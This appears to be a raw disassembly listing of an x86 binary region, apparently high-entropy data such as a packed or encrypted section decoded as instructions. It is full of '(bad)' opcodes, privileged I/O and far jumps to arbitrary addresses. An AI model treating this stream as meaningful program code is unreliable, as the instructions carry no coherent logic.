  40e528:	add    ah,BYTE PTR [eax+0x27]
  40e52b:	icebp  
  40e52c:	xchg   esp,eax
  40e52d:	clc    
  40e52e:	ins    BYTE PTR es:[edi],dx
  40e52f:	mov    esi,fs
  40e531:	lock out dx,al
  40e533:	cmc    
  40e534:	jbe    0x40e56c
  40e536:	jecxz  0x40e4df
  40e538:	push   ecx
  40e539:	or     dl,BYTE PTR [ebp+0x4b]
  40e53c:	enter  0x8e98,0xda
  40e540:	cmc    
  40e541:	dec    esi
  40e542:	jle    0x40e599
  40e544:	dec    ecx
  40e545:	jbe    0x40e4dc
  40e547:	jg     0x40e55f
  40e549:	lods   eax,DWORD PTR ds:[esi]
  40e54a:	mov    bh,0xc1
  40e54c:	bound  edx,QWORD PTR [edx+0x7d0486f1]
  40e552:	arpl   WORD PTR [ebx-0x32],bp
  40e555:	push   es
  40e556:	loopne 0x40e5a7
  40e558:	ficomp WORD PTR [ebx]
  40e55a:	xchg   BYTE PTR [edi-0x5c],bh
  40e55d:	icebp  
  40e55e:	or     DWORD PTR [eax-0x5ca5c71a],0x384c9128
  40e568:	push   ebp
  40e569:	adc    BYTE PTR [ebx-0x3],0xfc
  40e56d:	jle    0x40e4f0
  40e56f:	lock or ah,BYTE PTR [ebx*2+0x4135ba17]
  40e577:	lea    eax,[edi+0x24]
  40e57a:	sar    BYTE PTR [edx-0x30],cl
  40e57d:	test   DWORD PTR ds:0xc64d00c7,edi
  40e583:	inc    ebx
  40e584:	mov    dh,0x8a
  40e586:	gs jns 0x40e5f7
  40e589:	pop    ebp
  40e58a:	adc    eax,0xa7a6807f
  40e58f:	outs   dx,BYTE PTR ds:[esi]
  40e590:	add    ebp,DWORD PTR [ebx]
  40e592:	call   0x1af2b94
  40e597:	pop    ebp
  40e598:	or     edx,ecx
  40e59a:	fdivr  DWORD PTR [esi+ebp*1]
  40e59d:	imul   ecx,DWORD PTR [esp+eax*4],0xffffffb5
  40e5a1:	dec    edi
  40e5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5a3:	ins    DWORD PTR es:[edi],dx
  40e5a4:	cmp    ecx,DWORD PTR [ecx+0x6e]
  40e5a7:	dec    ebp
  40e5a8:	fdiv   DWORD PTR [ebp+0x3a8837a9]
  40e5ae:	jmp    0x40e58a
  40e5b0:	mov    ecx,0x96556776
  40e5b5:	lock mov dl,0x0
  40e5b8:	and    ah,bh
  40e5ba:	iret   
  40e5bb:	push   esp
  40e5bc:	lahf   
  40e5bd:	pushf  
  40e5be:	(bad)  
  40e5bf:	out    0xfb,al
  40e5c1:	and    eax,0x823ff228
  40e5c6:	mov    al,ds:0x19bfc5f2
  40e5cb:	or     BYTE PTR [ecx-0x1b22a370],bl
  40e5d1:	addr16 mov al,ds:0xf1c7
  40e5d5:	mov    edi,0xb561c6d6
  40e5da:	xchg   DWORD PTR [esi],ebx
  40e5dc:	or     al,0x6
  40e5de:	or     eax,0xaa5465ac
  40e5e3:	jno    0x40e610
  40e5e5:	retf   0x1f2c
  40e5e8:	popf   
  40e5e9:	nop
  40e5ea:	fidivr DWORD PTR ds:0x588330f6
  40e5f0:	cmp    BYTE PTR [esi-0x16389df3],ah
  40e5f6:	in     eax,0x9f
  40e5f8:	or     al,0x72
  40e5fa:	(bad)  
  40e5fb:	out    dx,al
  40e5fc:	mov    ecx,0x8e4028eb
  40e601:	xchg   ebp,eax
  40e602:	enter  0x23cf,0x65
  40e606:	push   ecx
  40e607:	outs   dx,DWORD PTR ds:[esi]
  40e608:	sub    dl,BYTE PTR [esi]
  40e60a:	aas    
  40e60b:	std    
  40e60c:	adc    eax,0x15a52de6
  40e611:	mov    dh,BYTE PTR [esi+0x21]
  40e614:	outs   dx,BYTE PTR ds:[esi]
  40e615:	hlt    
  40e616:	jne    0x40e5c4
  40e618:	fcomp  QWORD PTR [ebx+esi*8]
  40e61b:	shl    DWORD PTR [esi-0x61],cl
  40e61e:	dec    esp
  40e61f:	lahf   
  40e620:	xchg   ebp,eax
  40e621:	loopne 0x40e643
  40e623:	xchg   esp,eax
  40e624:	or     eax,0x5ba55fb0
  40e629:	out    0x1a,eax
  40e62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e62c:	gs repz cmp al,0x7a
  40e630:	add    eax,0xa01e22a8
  40e635:	test   DWORD PTR [esi-0x10],esi
  40e638:	fwait
  40e639:	inc    dl
  40e63b:	iret   
  40e63c:	stos   BYTE PTR es:[edi],al
  40e63d:	repnz pop ebp
  40e63f:	cmp    edi,ebp
  40e641:	jp     0x40e668
  40e643:	fadd   QWORD PTR [eax-0xc64c38f]
  40e649:	(bad)  [edx+0x106633d6]
  40e64f:	adc    edx,esp
  40e651:	push   esp
  40e652:	icebp  
  40e653:	(bad)  
  40e654:	mov    ebx,0x26161358
  40e659:	cmp    ah,BYTE PTR [ebp+0x27fed904]
  40e65f:	sub    eax,0x642ffd76
  40e664:	mov    dh,cl
  40e666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e667:	and    ecx,edi
  40e669:	repnz cs pop edx
  40e66c:	mov    al,ds:0x1275f639
  40e671:	fmul   QWORD PTR [edi-0x6d258aeb]
  40e677:	or     al,0x7e
  40e679:	aas    
  40e67a:	ins    DWORD PTR es:[edi],dx
  40e67b:	jb     0x40e681
  40e67d:	ret    0xa13b
  40e680:	ror    DWORD PTR [ebp-0x72ec0e51],1
  40e686:	push   esi
  40e687:	jp     0x40e6e3
  40e689:	hlt    
  40e68a:	mov    eax,0x6a713b32
  40e68f:	fs retf 0x9cdc
  40e693:	test   BYTE PTR [esi],0x77
  40e696:	inc    ebp
  40e697:	jle    0x40e69a
  40e699:	icebp  
  40e69a:	test   eax,0x98dd6851
  40e69f:	dec    esi
  40e6a0:	xor    al,dl
  40e6a2:	xor    BYTE PTR [edi],bl
  40e6a4:	push   es
  40e6a5:	xchg   ebp,eax
  40e6a6:	ds aas 
  40e6a8:	or     eax,0x911483cd
  40e6ad:	and    eax,0xdd42f8a1
  40e6b2:	and    eax,0xd1d16b66
  40e6b7:	sub    ch,bh
  40e6b9:	mov    DWORD PTR [bx+0x1f2d],edx
  40e6be:	sbb    esi,esi
  40e6c0:	(bad)  
  40e6c1:	loopne 0x40e6e4
  40e6c3:	push   edi
  40e6c4:	stc    
  40e6c5:	repnz xor BYTE PTR ds:[edx+0x48],ch
  40e6ca:	mov    cl,0x9e
  40e6cc:	add    ecx,DWORD PTR [esi-0x3]
  40e6cf:	(bad)  
  40e6d0:	sub    al,0x6
  40e6d2:	push   esi
  40e6d3:	lds    esp,FWORD PTR [eax+0x2871afad]
  40e6d9:	push   edi
  40e6da:	sar    DWORD PTR ds:[ecx-0x6],1
  40e6de:	jg     0x40e6ec
  40e6e0:	test   edx,esi
  40e6e2:	jle    0x40e75d
  40e6e4:	or     ecx,ecx
  40e6e6:	loopne 0x40e68e
  40e6e8:	pop    esi
  40e6e9:	fdiv   DWORD PTR [ecx+0x318c36d]
  40e6ef:	adc    ebx,edx
  40e6f1:	add    BYTE PTR [ebx+0x53],cl
  40e6f4:	add    edx,ecx
  40e6f6:	jg     0x40e6d2
  40e6f8:	add    bh,BYTE PTR [eax]
  40e6fa:	mov    ah,0xcb
  40e6fc:	ins    BYTE PTR es:[edi],dx
  40e6fd:	or     al,BYTE PTR [edi-0x71]
  40e700:	xor    al,0x2c
  40e702:	enter  0x788,0x80
  40e706:	inc    edi
  40e707:	cmp    cl,BYTE PTR [eax+0x45]
  40e70a:	adc    eax,0xa965396e
  40e70f:	add    eax,0x9a168404
  40e714:	add    eax,0xcbdebd06
  40e719:	mov    cl,0x4c
  40e71b:	mov    ecx,0x44b1e80e
  40e720:	fcom   st(4)
  40e722:	xor    bh,al
  40e724:	stos   DWORD PTR es:[edi],eax
  40e725:	(bad)  
  40e726:	ds ret 0xdcb0
  40e72a:	mov    ecx,0x50863adb
  40e72f:	lods   al,BYTE PTR ds:[esi]
  40e730:	inc    ebp
  40e731:	addr16 clc 
  40e733:	jl     0x40e73e
  40e735:	hlt    
  40e736:	aam    0x9
  40e738:	leave  
  40e739:	pop    esi
  40e73a:	jle    0x40e749
  40e73c:	ret    0x9ded
  40e73f:	cmova  eax,DWORD PTR [ebp+0x3]
  40e743:	adc    eax,0x1f4368b5
  40e748:	and    DWORD PTR [edi+ebx*1-0x2d2a16ee],0xab36b6d0
  40e753:	inc    eax
  40e754:	jb     0x40e710
  40e756:	xchg   BYTE PTR [edi+0x74],ah
  40e759:	leave  
  40e75a:	pushf  
  40e75b:	jmp    ebx
  40e75d:	mov    bh,BYTE PTR [edx-0x43]
  40e760:	enter  0xeaff,0x92
  40e764:	mov    cl,0xc9
  40e766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e767:	dec    esi
  40e768:	push   esi
  40e769:	bound  esi,QWORD PTR [edi+ecx*1]
  40e76c:	xor    dh,ah
  40e76e:	adc    edi,DWORD PTR [esi+esi*8-0x5da334e7]
  40e775:	cmp    al,0xa9
  40e777:	fsubr  DWORD PTR [edx]
  40e779:	js     0x40e72c
  40e77b:	xchg   esi,ebx
  40e77d:	sub    BYTE PTR [esi-0x792b1535],ch
  40e783:	imul   ecx,DWORD PTR [eax],0xffffffed
  40e786:	sbb    ch,BYTE PTR [ebp-0x3c]
  40e789:	or     eax,0x2031e2c8
  40e78e:	int3   
  40e78f:	cli    
  40e790:	mov    bl,0x4b
  40e792:	shr    BYTE PTR [eax-0x7],1
  40e795:	xchg   ebx,eax
  40e796:	cs mov bl,0xf1
  40e799:	pop    ebx
  40e79a:	rcr    BYTE PTR [ebp+eiz*2+0x19],cl
  40e79e:	xchg   ecx,eax
  40e79f:	pop    ds
  40e7a0:	out    0x87,eax
  40e7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7a3:	dec    ebx
  40e7a4:	call   FWORD PTR [esp+ebp*4-0x27]
  40e7a8:	pop    esi
  40e7a9:	jg     0x40e7cb
  40e7ab:	sahf   
  40e7ac:	mov    esi,0x6761ba64
  40e7b1:	in     al,dx
  40e7b2:	inc    ebp
  40e7b3:	push   es
  40e7b4:	pop    ss
  40e7b5:	cmp    eax,edx
  40e7b7:	dec    ebp
  40e7b8:	das    
  40e7b9:	icebp  
  40e7ba:	mov    dl,dl
  40e7bc:	jbe    0x40e76f
  40e7be:	outs   dx,DWORD PTR ds:[si]
  40e7c0:	push   esi
  40e7c1:	cdq    
  40e7c2:	popa   
  40e7c3:	into   
  40e7c4:	retf   0xbdd7
  40e7c7:	fs mov bh,BYTE PTR fs:[ecx+eiz*1-0xd]
  40e7cd:	ss cmp ah,dl
  40e7d0:	or     DWORD PTR [edx+ebx*4],ebp
  40e7d3:	cmp    DWORD PTR [esi],eax
  40e7d5:	shl    DWORD PTR [edx+esi*1],1
  40e7d8:	inc    edi
  40e7d9:	push   esi
  40e7da:	mov    ecx,0x59be97a9
  40e7df:	add    BYTE PTR [edi-0x46],0x3f
  40e7e3:	cmp    DWORD PTR [eax],edx
  40e7e5:	jne    0x40e7d6
  40e7e7:	loopne 0x40e7e0
  40e7e9:	or     ah,BYTE PTR [eax+0x22]
  40e7ec:	inc    ecx
  40e7ed:	mov    ecx,0xe87fca5a
  40e7f2:	call   0xd228:0x2dec9c76
  40e7f9:	adc    BYTE PTR [ebx-0x6c4c5756],al
  40e7ff:	sti    
  40e800:	retf   0x3fb2
  40e803:	inc    ch
  40e805:	xor    edi,ebx
  40e807:	dec    ebx
  40e808:	or     dh,bl
  40e80a:	mov    WORD PTR [eax],?
  40e80c:	out    dx,eax
  40e80d:	outs   dx,BYTE PTR ds:[esi]
  40e80e:	aad    0x5f
  40e810:	inc    edi
  40e811:	stc    
  40e812:	add    al,0xf
  40e814:	push   edi
  40e815:	jne    0x40e871
  40e817:	scas   al,BYTE PTR es:[edi]
  40e818:	pop    ds
  40e819:	inc    ebx
  40e81a:	scas   al,BYTE PTR es:[edi]
  40e81b:	shl    edx,1
  40e81d:	ins    BYTE PTR es:[edi],dx
  40e81e:	mov    ebx,esi
  40e820:	popa   
  40e821:	mov    ds:0xe0e0fab8,eax
  40e826:	ret    
  40e827:	mov    ebp,0x800c0b71
  40e82c:	mov    edi,0x3257dee1
  40e831:	mov    DWORD PTR [edx-0x13e1311],ecx
  40e837:	push   eax
  40e838:	dec    esp
  40e839:	in     eax,0x79
  40e83b:	addr16 push 0x43
  40e83e:	rdmsr  
  40e840:	and    edx,0x1e
  40e843:	fldenv [ebx]
  40e845:	and    cl,BYTE PTR [ebx+0x31661093]
  40e84b:	jmp    0x2dfe8998
  40e850:	add    ebp,DWORD PTR [edx+0x47]
  40e853:	(bad)  
  40e854:	ja     0x40e865
  40e856:	out    0xde,al
  40e858:	pop    esi
  40e859:	shl    DWORD PTR [ecx-0x2a],0xba
  40e85d:	push   ebp
  40e85e:	jo     0x40e86a
  40e860:	push   cs
  40e861:	pop    ds
  40e862:	cmp    cl,dl
  40e864:	or     eax,0x1759679d
  40e869:	mov    dl,0x97
  40e86b:	or     al,0xad
  40e86d:	push   eax
  40e86e:	shr    DWORD PTR [esi+0x66],1
  40e871:	jecxz  0x40e84c
  40e873:	sbb    DWORD PTR [ebx+0x19dd9bd2],edx
  40e879:	and    cl,BYTE PTR [edx-0x38]
  40e87c:	out    dx,eax
  40e87d:	or     bl,ch
  40e87f:	test   DWORD PTR [eax-0x597344e6],edx
  40e885:	imul   ecx,DWORD PTR [ebx+0x20],0xffffffb8
  40e889:	das    
  40e88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e88b:	mov    WORD PTR [ecx],es
  40e88d:	hlt    
  40e88e:	pop    ebp
  40e88f:	push   0x56bbdae8
  40e894:	and    esi,DWORD PTR [ebp+0x34c10d5a]
  40e89a:	jne    0x40e8b4
  40e89c:	xchg   edi,eax
  40e89d:	ds mov edx,eax
  40e8a0:	das    
  40e8a1:	xor    al,0xbc
  40e8a3:	inc    esi
  40e8a4:	add    DWORD PTR ds:0x1ced8eae,esi
  40e8aa:	and    eax,0x5f3bd149
  40e8af:	and    ebp,DWORD PTR [eax]
  40e8b1:	lahf   
  40e8b2:	dec    edx
  40e8b3:	scas   al,BYTE PTR es:[edi]
  40e8b4:	out    dx,al
  40e8b5:	sub    BYTE PTR [eax-0xf627d4d],dh
  40e8bb:	mov    al,0xb8
  40e8bd:	into   
  40e8be:	aas    
  40e8bf:	(bad)  
  40e8c0:	call   0x8a3c:0x534f7330
  40e8c7:	mov    dh,0xfc
  40e8c9:	(bad)  
  40e8ca:	ficom  DWORD PTR [ebx]
  40e8cc:	or     BYTE PTR [eax+0x2b],cl
  40e8cf:	push   ss
  40e8d0:	in     al,dx
  40e8d1:	test   eax,0x27db153f
  40e8d6:	xor    al,BYTE PTR [ecx+0x52]
  40e8d9:	mov    bl,BYTE PTR [esp+ebx*1-0x5c9f9c24]
  40e8e0:	pop    eax
  40e8e1:	mov    ah,0x19
  40e8e3:	scas   al,BYTE PTR es:[edi]
  40e8e4:	pop    ecx
  40e8e5:	jb     0x40e86d
  40e8e7:	and    DWORD PTR [edx],0xfffffffc
  40e8ea:	push   ss
  40e8eb:	xlat   BYTE PTR ds:[ebx]
  40e8ec:	mov    ebx,0xe92057ad
  40e8f1:	out    0xe2,al
  40e8f3:	xchg   ecx,eax
  40e8f4:	inc    eax
  40e8f5:	loopne 0x40e93f
  40e8f7:	stos   BYTE PTR es:[edi],al
  40e8f8:	add    BYTE PTR [esi],0x20
  40e8fb:	pop    ss
  40e8fc:	mov    BYTE PTR [eax+0x67c7e008],cl
  40e902:	retf   0x8c01
  40e905:	inc    ebp
  40e906:	sub    al,0x51
  40e908:	neg    bl
  40e90a:	adc    BYTE PTR [ebp-0x361c0046],bh
  40e910:	sub    bl,BYTE PTR [ecx+0x2315ae2]
  40e916:	sbb    edx,DWORD PTR [ecx-0x6a1e9b20]
  40e91c:	neg    BYTE PTR [esp+edi*1]
  40e91f:	rol    BYTE PTR [eax-0x4d9394f3],1
  40e925:	nop
  40e926:	push   edi
  40e927:	xchg   al,dl
  40e929:	aad    0xc0
  40e92b:	outs   dx,DWORD PTR ds:[esi]
  40e92c:	std    
  40e92d:	(bad)  
  40e92e:	mov    eax,0xcc7d65b6
  40e933:	aaa    
  40e934:	and    ch,BYTE PTR ds:0x709b7b07
  40e93a:	ins    BYTE PTR es:[edi],dx
  40e93b:	nop
  40e93c:	add    BYTE PTR [esi+eiz*2],0xdc
  40e940:	cmp    al,0x25
  40e942:	sub    eax,0xfa44bca8
  40e947:	(bad)  
  40e948:	int3   
  40e949:	mov    ebp,0x7bc64668
  40e94e:	sbb    BYTE PTR [ecx],ah
  40e950:	je     0x40e919
  40e952:	fist   DWORD PTR [ebx]
  40e954:	rcl    eax,cl
  40e956:	and    eax,0x9bfb816a
  40e95b:	mov    ds:0xe1fbdf67,al
  40e960:	lahf   
  40e961:	and    WORD PTR [ebx+0x2c09ea46],bp
  40e968:	sub    BYTE PTR [edx+0x42d0c33],0x8e
  40e96f:	popa   
  40e970:	adc    cl,BYTE PTR ds:[esi+ecx*4+0x11dcc83e]
  40e978:	or     al,0xc4
  40e97a:	ds loop 0x40e98e
  40e97d:	add    ah,BYTE PTR [ecx]
  40e97f:	lds    ebp,FWORD PTR [ecx-0x39]
  40e982:	cwde   
  40e983:	dec    edi
  40e984:	retf   
  40e985:	inc    edx
  40e986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e987:	dec    esi
  40e988:	jnp    0x40e9b1
  40e98a:	add    ebx,esp
  40e98c:	das    
  40e98d:	lods   al,BYTE PTR ds:[esi]
  40e98e:	out    0x3c,al
  40e990:	xchg   ebp,eax
  40e991:	hlt    
  40e992:	sub    al,0xb5
  40e994:	nop
  40e995:	ret    0x3e40
  40e998:	hlt    
  40e999:	enter  0x1228,0x51
  40e99d:	leave  
  40e99e:	dec    edi
  40e99f:	das    
  40e9a0:	loop   0x40ea14
  40e9a2:	sbb    edx,DWORD PTR [esi+ebp*1]
  40e9a5:	ror    edi,0x44
  40e9a8:	fisub  DWORD PTR [eax+0x1cf3a12]
  40e9ae:	in     al,dx
  40e9af:	xor    bh,bl
  40e9b1:	lock or BYTE PTR [esi],bh
  40e9b4:	test   DWORD PTR [ebx],edx
  40e9b6:	loope  0x40e968
  40e9b8:	mov    ds:0xb7b3d5dd,eax
  40e9bd:	test   eax,0xcca797bf
  40e9c2:	push   ds
  40e9c3:	jp     0x40e955
  40e9c5:	cmp    eax,0xa93af495
  40e9ca:	xor    bh,BYTE PTR [ebp-0xf73c41e]
  40e9d0:	adc    esp,ebp
  40e9d2:	jecxz  0x40e993
  40e9d4:	push   cs
  40e9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d6:	mov    ch,0x99
  40e9d8:	aad    0x6a
  40e9da:	aam    0x77
  40e9dc:	sub    al,0x88
  40e9de:	dec    esp
  40e9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9e0:	inc    edx
  40e9e1:	out    dx,eax
  40e9e2:	out    dx,eax
  40e9e3:	ins    BYTE PTR es:[edi],dx
  40e9e4:	je     0x40e9a6
  40e9e6:	clc    
  40e9e7:	cli    
  40e9e8:	rcr    ch,1
  40e9ea:	sbb    BYTE PTR [edx+0x2faf4751],bl
  40e9f0:	leave  
  40e9f1:	sub    edi,DWORD PTR [eax+esi*2+0x41]
  40e9f5:	adc    bl,bh
  40e9f7:	popa   
  40e9f8:	les    ecx,FWORD PTR [esi+eax*8+0x11]
  40e9fc:	cli    
  40e9fd:	stos   DWORD PTR es:[edi],eax
  40e9fe:	inc    ecx
  40e9ff:	jnp    0x40e997
  40ea01:	and    eax,0x9d29d849
  40ea06:	fs jle 0x40ea0a
  40ea09:	dec    esp
  40ea0a:	xchg   ecx,eax
  40ea0b:	and    ebp,DWORD PTR [ebp+0x7d]
  40ea0e:	into   
  40ea0f:	(bad)  
  40ea10:	xor    ebx,DWORD PTR [edi+0x30]
  40ea13:	sbb    ah,BYTE PTR [ebx+0x1e]
  40ea16:	hlt    
  40ea17:	xlat   BYTE PTR ds:[ebx]
  40ea18:	addr16 jo 0x40ea68
  40ea1b:	scas   eax,DWORD PTR es:[edi]
  40ea1c:	xchg   ebx,eax
  40ea1d:	adc    bl,bl
  40ea1f:	inc    edx
  40ea20:	jmp    0x1555:0x2d27a31e
  40ea27:	int    0x91
  40ea29:	dec    ebp
  40ea2a:	outs   dx,DWORD PTR ds:[esi]
  40ea2b:	add    bh,ch
  40ea2d:	jo     0x40ea33
  40ea2f:	push   edi
  40ea30:	fst    DWORD PTR [esi+0x5d]
  40ea33:	cmp    ah,al
  40ea35:	jp     0x40e9e3
  40ea37:	xchg   esp,eax
  40ea38:	xchg   DWORD PTR [esi],ebp
  40ea3a:	push   0xffffffbf
  40ea3c:	jge    0x40e9ca
  40ea3e:	ja     0x40ea0f
  40ea40:	enter  0xb77d,0x59
  40ea44:	adc    BYTE PTR [eax+0x2df01eab],0x26
  40ea4b:	dec    eax
  40ea4c:	or     eax,0xff7d2f7a
  40ea51:	pop    ebx
  40ea52:	and    eax,0x50d52028
  40ea57:	clc    
  40ea58:	xchg   esp,eax
  40ea59:	ja     0x40ea61
  40ea5b:	cmp    al,0x60
  40ea5d:	mov    eax,ss
  40ea5f:	pop    es
  40ea60:	add    DWORD PTR [esi-0x7673130d],ebp
  40ea66:	adc    DWORD PTR [ebx-0x29],esi
  40ea69:	jo     0x40ea52
  40ea6b:	sub    BYTE PTR [eax],dh
  40ea6d:	shl    DWORD PTR [edx-0x7d],1
  40ea70:	lea    esp,fs:[ebp+0x545fccf9]
  40ea77:	loopne 0x40eabb
  40ea79:	lods   al,BYTE PTR ds:[esi]
  40ea7a:	stc    
  40ea7b:	clc    
  40ea7c:	ret    
  40ea7d:	iret   
  40ea7e:	xor    esi,DWORD PTR [edi-0x51]
  40ea81:	lea    ebx,[edi]
  40ea83:	and    edx,DWORD PTR [esi-0x57fdeb14]
  40ea89:	push   ss
  40ea8a:	xor    DWORD PTR [ebx-0x1b916b1c],0xd2a80f96
  40ea94:	xchg   esi,eax
  40ea95:	hlt    
  40ea96:	ret    
  40ea97:	imul   edi,DWORD PTR [edi],0xfffffff2
  40ea9a:	dec    ebx
  40ea9b:	daa    
  40ea9c:	and    esi,DWORD PTR [ebp+0x7d846e3f]
  40eaa2:	sub    eax,0x4270299
  40eaa7:	sahf   
  40eaa8:	pop    eax
  40eaa9:	rol    BYTE PTR [edx+0x234939ed],0x73
  40eab0:	push   esi
  40eab1:	xchg   ebp,eax
  40eab2:	jg     0x40eaeb
  40eab4:	xchg   ecx,eax
  40eab5:	shl    dl,0x1d
  40eab8:	call   DWORD PTR [ecx+eax*4+0x56b1f5d0]
  40eabf:	xchg   esi,eax
  40eac0:	xor    BYTE PTR [ebp-0x3d3d654c],ah
  40eac6:	cmp    bh,ah
  40eac8:	imul   esp,ecx,0x26f42ebb
  40eace:	rcr    BYTE PTR [ebx+0x6b1ded0],cl
  40ead4:	push   edi
  40ead5:	mov    ebp,es
  40ead7:	ficom  DWORD PTR [ebp-0x58]
  40eada:	cld    
  40eadb:	lea    eax,[ecx+0x63]
  40eade:	and    DWORD PTR [edi-0x50],ecx
  40eae1:	popf   
  40eae2:	sbb    al,BYTE PTR [edx+eiz*1]
  40eae5:	xor    esi,eax
  40eae7:	cmc    
  40eae8:	push   cs
  40eae9:	mov    BYTE PTR [eax+ecx*4],cl
  40eaec:	std    
  40eaed:	std    
  40eaee:	mov    edi,0xb781c1bb
  40eaf3:	push   ss
  40eaf4:	mov    dl,0xc1
  40eaf6:	adc    DWORD PTR [ecx],edi
  40eaf8:	and    BYTE PTR [esi-0x46d9e177],bh
  40eafe:	sub    eax,0xaf3248a7
  40eb03:	pop    es
  40eb04:	ret    0x354d
  40eb07:	(bad)  
  40eb08:	out    dx,eax
  40eb09:	xor    DWORD PTR [edi-0x38],esi
  40eb0c:	loope  0x40eb30
  40eb0e:	into   
  40eb0f:	and    esp,ebx
  40eb11:	loopne 0x40eb37
  40eb13:	pop    ebp
  40eb14:	jmp    0x52cf:0x3f69f08e
  40eb1b:	or     esi,ecx
  40eb1d:	pop    eax
  40eb1e:	cmp    ah,BYTE PTR [edx+0x463c3a30]
  40eb24:	jecxz  0x40eb0a
  40eb26:	popf   
  40eb27:	push   esi
  40eb28:	push   es
  40eb29:	jbe    0x40eb47
  40eb2b:	mov    dh,0xae
  40eb2d:	xor    BYTE PTR [ecx-0x48],dh
  40eb30:	pop    ss
  40eb31:	jmp    DWORD PTR [eax+0x30]
  40eb34:	push   0xffffffc2
  40eb36:	popa   
  40eb37:	pop    es
  40eb38:	test   DWORD PTR [edi-0x5f4741b5],esi
  40eb3e:	inc    edx
  40eb3f:	push   esi
  40eb40:	fst    DWORD PTR [esi-0x1e]
  40eb43:	dec    edx
  40eb44:	ins    DWORD PTR es:[edi],dx
  40eb45:	lea    ebp,[edi-0x33]
  40eb48:	out    0x23,al
  40eb4a:	mov    esi,0xcd316bdd
  40eb4f:	push   ebp
  40eb50:	pop    esp
  40eb51:	dec    esp
  40eb52:	jl     0x40ebbd
  40eb54:	adc    eax,0x52ee5360
  40eb59:	add    BYTE PTR [edx+eiz*4-0xd50e261],bh
  40eb60:	je     0x40eb85
  40eb62:	ror    DWORD PTR ss:[ebp+0x4c],1
  40eb66:	jb     0x40ebb5
  40eb68:	xor    dh,BYTE PTR [ebx]
  40eb6a:	clc    
  40eb6b:	scas   eax,DWORD PTR es:[edi]
  40eb6c:	call   0x481b3037
  40eb71:	call   0xddb1e2d3
  40eb76:	pop    ebx
  40eb77:	aas    
  40eb78:	jge    0x40ebad
  40eb7a:	dec    ebp
  40eb7b:	arpl   WORD PTR [eax],si
  40eb7d:	xchg   ecx,eax
  40eb7e:	sahf   
  40eb7f:	inc    ebp
  40eb80:	inc    dx
  40eb82:	jb     0x40eb60
  40eb84:	pop    eax
  40eb85:	push   ss
  40eb86:	mov    ebx,0xa1ef76dd
  40eb8b:	in     al,dx
  40eb8c:	int    0x18
  40eb8e:	jno    0x40eb16
  40eb90:	rcr    DWORD PTR [ebp+0x77b994a],cl
  40eb96:	(bad)  
  40eb97:	jg     0x40ebae
  40eb99:	add    eax,0xe7f89be0
  40eb9e:	xchg   BYTE PTR [edi+ebp*1-0x47528582],dl
  40eba5:	sbb    DWORD PTR [edx],0xf4cd54f
  40ebab:	ret    
  40ebac:	int    0x28
  40ebae:	loop   0x40eb78
  40ebb0:	dec    esi
  40ebb1:	pop    eax
  40ebb2:	jle    0x40ec14
  40ebb4:	and    ch,al
  40ebb6:	xor    al,0x45
  40ebb8:	push   ds
  40ebb9:	imul   esi,edx,0x56
  40ebbc:	xor    eax,0xf94bd639
  40ebc1:	push   ds
  40ebc2:	xchg   eax,edx
  40ebc4:	jmp    0x40ec34
  40ebc6:	xchg   ecx,eax
  40ebc7:	jae    0x40ebcd
  40ebc9:	(bad)  
  40ebca:	ins    DWORD PTR es:[edi],dx
  40ebcb:	jmp    DWORD PTR ds:0x76320eff
  40ebd1:	xchg   ecx,eax
  40ebd2:	test   al,0xb5
  40ebd4:	mov    WORD PTR [ebx+edx*1-0x18a09b80],gs
  40ebdb:	es push 0x7d
  40ebde:	jae    0x40ebe6
  40ebe0:	es leave 
  40ebe2:	and    edx,DWORD PTR [edi+0x347e4583]
  40ebe8:	dec    dh
  40ebea:	fidiv  WORD PTR [esi]
  40ebec:	or     eax,0x4437d1b6
  40ebf1:	adc    DWORD PTR [ebx-0x41],esp
  40ebf4:	(bad)  
  40ebf5:	mov    cl,0x53
  40ebf7:	mov    ds:0xd5667158,eax
  40ebfc:	fwait
  40ebfd:	dec    ebx
  40ebfe:	push   ecx
  40ebff:	cmc    
  40ec00:	popa   
  40ec01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec02:	aaa    
  40ec03:	mov    WORD PTR [ebp-0x51],cs
  40ec06:	stos   BYTE PTR es:[edi],al
  40ec07:	out    dx,eax
  40ec08:	push   edi
  40ec09:	mov    eax,ds:0x9299311e
  40ec0e:	push   ebp
  40ec0f:	mov    al,ds:0x23955df8
  40ec14:	hlt    
  40ec15:	aam    0xc4
  40ec17:	scas   al,BYTE PTR es:[edi]
  40ec18:	je     0x40ebc7
  40ec1a:	out    dx,al
  40ec1b:	mov    esp,0xc28aa437
  40ec20:	sbb    BYTE PTR [ebx+0x5388641d],0x5
  40ec27:	fmul   QWORD PTR [edi]
  40ec29:	test   DWORD PTR [eax],esp
  40ec2b:	fbstp  TBYTE PTR [esi-0x5344063d]
  40ec31:	mov    bh,0xf3
  40ec33:	mov    edx,ecx
  40ec35:	sti    
  40ec36:	sti    
  40ec37:	cmp    BYTE PTR [edx+0x7590ca13],bh
  40ec3d:	or     eax,0x9dfaa933
  40ec42:	ret    0x10fe
  40ec45:	stc    
  40ec46:	repnz not BYTE PTR [edi+ecx*2]
  40ec4a:	dec    edi
  40ec4b:	dec    eax
  40ec4c:	adc    bh,BYTE PTR [eax-0x50cf91ed]
  40ec52:	fidivr WORD PTR [edx+0x44]
  40ec55:	push   es
  40ec56:	xor    eax,0xec5e26e6
  40ec5b:	ret    0x6d49
  40ec5e:	xor    DWORD PTR [esp+ebx*4],edx
  40ec61:	inc    edi
  40ec62:	xor    eax,0x90e91eea
  40ec67:	out    dx,al
  40ec68:	retf   
  40ec69:	loope  0x40ecb1
  40ec6b:	dec    edx
  40ec6c:	mov    esi,0x924eaeb6
  40ec71:	ins    BYTE PTR es:[edi],dx
  40ec72:	xor    esp,eax
  40ec74:	or     al,0xbb
  40ec76:	pop    eax
  40ec77:	(bad)  
  40ec78:	xor    al,0xeb
  40ec7a:	jb     0x40ecd5
